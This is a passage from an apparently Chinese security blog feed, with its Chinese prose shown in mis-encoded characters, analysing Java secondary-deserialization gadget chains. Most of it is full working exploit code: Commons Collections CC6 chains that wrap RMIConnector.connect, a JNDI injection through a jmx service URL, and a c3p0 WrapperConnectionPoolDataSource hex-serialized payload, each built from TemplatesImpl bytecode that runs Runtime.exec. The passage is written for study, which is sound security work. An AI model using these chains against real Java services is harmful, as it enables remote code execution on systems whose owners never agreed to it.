class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        connect(<span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(Map&lt;String,?&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">tracing</span> <span class="hljs-operator">=</span> logger.traceOn();<br>    <span class="hljs-type">String</span>        <span class="hljs-variable">idstr</span>   <span class="hljs-operator">=</span> (tracing?<span class="hljs-string">&quot;[&quot;</span>+<span class="hljs-built_in">this</span>.toString()+<span class="hljs-string">&quot;]&quot;</span>:<span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (terminated) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already closed.&quot;</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Connector closed&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (connected) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already connected.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; usemap =<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;((<span class="hljs-built_in">this</span>.env==<span class="hljs-literal">null</span>) ?<br>                                        Collections.&lt;String, Object&gt;emptyMap() : <span class="hljs-built_in">this</span>.env);<br><br>        <span class="hljs-keyword">if</span> (environment != <span class="hljs-literal">null</span>) &#123;<br>            EnvHelp.checkAttributes(environment);<br>            usemap.putAll(environment);<br>        &#125;<br><br>        <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>        <span class="hljs-keyword">if</span> (tracing) logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; finding stub...&quot;</span>);<br>        <span class="hljs-type">RMIServer</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, usemap);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doStart</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>    RMIServer stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, env);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨CCé“¾çš„<code>InvokerTransformer</code>æ¥è§¦å‘<code>connect</code>ï¼ˆ<code>doStart</code>è¢«<code>protected</code>ä¿®é¥°ï¼Œä¸èƒ½ç”¨<code>InvokerTransformer</code>è§¦å‘ï¼‰ï¼š</p><p>ä»¥CC6ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIConnectorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/stub/&quot;</span> + getCode()), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">invokeTransformer</span> <span class="hljs-operator">=</span> InvokerTransformer.getInstance(<span class="hljs-string">&quot;connect&quot;</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">constantTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, constantTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(entry, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">// å°†çœŸæ­£çš„transformersæ•°ç»„è®¾ç½®è¿›æ¥</span><br>        setValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokeTransformer);<br>        setValue(entry,<span class="hljs-string">&quot;key&quot;</span>, rmiConnector);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>findRMIServerJRMP</code>æ”¯æŒ<code>jndi</code>ã€<code>stub</code>ã€<code>iiop</code></p><p>è·Ÿè¿›<code>path</code>ä»¥<code>/jndi/</code>å¼€å¤´çš„åˆ†æ”¯ï¼š<code>findRMIServerJNDI</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJNDI</span><span class="hljs-params">(String jndiURL, Map&lt;String, ?&gt; env,</span><br><span class="hljs-params">                                    <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> NamingException &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(EnvHelp.mapToHashtable(env));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">objref</span> <span class="hljs-operator">=</span> ctx.lookup(jndiURL);<br>    ctx.close();<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„<code>InitialContext#lookup</code>ï¼Œæ”¹ä¸€ä¸‹<code>path</code>å°±å¯ä»¥<code>jndi</code>æ³¨å…¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://127.0.0.1:8888/jndi/ldap://127.0.0.1:8099/aaa&quot;</span> )<br></code></pre></td></tr></table></figure><h2 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h2><p><code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setuserOverridesAsString</code>å¯ä»¥è·Ÿè¿›åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">C3P0ImplUtils#parseUserOverridesAsString<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">HASM_HEADER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">parseUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span>&#123; <br>    <span class="hljs-keyword">if</span> (userOverridesAsString != <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hexAscii</span> <span class="hljs-operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="hljs-number">1</span>, userOverridesAsString.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );<br>        <span class="hljs-keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> Collections.EMPTY_MAP;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œå­—ç¬¦æˆªå–æ˜¯ä»<code>HASM_HEADER.length() + 1</code>åˆ°<code>userOverridesAsString.length() - 1</code>ï¼Œæœ€åä¸€ä½ä¼šåƒæ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableUtils#fromByteArray<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">fromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123; <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> deserializeFromByteArray( bytes ); <br>    <span class="hljs-keyword">if</span> (out <span class="hljs-keyword">instanceof</span> IndirectlySerialized)<br>        <span class="hljs-keyword">return</span> ((IndirectlySerialized) out).getObject();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> out;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span>&#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>é…åˆ<code>fastjson</code>æˆ–<code>ROME</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.mchange.lang.ByteUtils;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getCC6Bytes() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;p4d0rn&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, templates);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        outerMap.clear();<br><br>        setValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> ByteUtils.toHexAscii(getCC6Bytes());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&#x27;!&#x27;</span>;<br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">wrapperConnectionPoolDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>();<br>        wrapperConnectionPoolDataSource.setUserOverridesAsString(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ul><li><p><a href="https://www.anquanke.com/post/id/256986#h3-9">https://www.anquanke.com/post/id/256986#h3-9</a></p></li><li><p><a href="https://y4tacker.github.io/2022/02/06/year/2022/2/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget%E7%9A%84%E5%AD%A6%E4%B9%A0/#hex%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8">c3p0çš„ä¸‰ä¸ªgadgetçš„å­¦ä¹  | Y4tackerâ€™s Blog</a></p></li><li><p><a href="https://p4d0rn.gitbook.io/java/others/desertwice#rmiconnector">Deserialization Twice | Java (gitbook.io)</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»å·…å³°æå®¢2023Baby_URLçœ‹äºŒæ¬¡ååºåˆ—åŒ–å’ŒJacksonåŸç”Ÿé“¾</title>
    <link href="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/"/>
    <url>/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/</url>
    
